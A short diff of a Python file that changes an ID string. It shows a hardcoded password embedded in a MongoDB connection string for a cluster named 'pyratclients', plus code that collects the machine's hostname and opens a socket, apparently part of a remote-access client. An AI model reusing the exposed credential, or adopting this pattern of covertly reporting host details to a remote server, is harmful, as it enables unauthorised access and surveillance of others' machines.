@@ -13,7 +13,7 @@ password = "SB5aaHgp2IYtT72e"
 connection_string = f"mongodb+srv://client:{password}@pyratclients.yq8xdfc.mongodb.net/?retryWrites=true&w=majority"
 
 
-temp_id = "makSgabzWk"
+temp_id = "kgmeiittai"
 pcname = socket.gethostname()
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 client = MongoClient(connection_string)
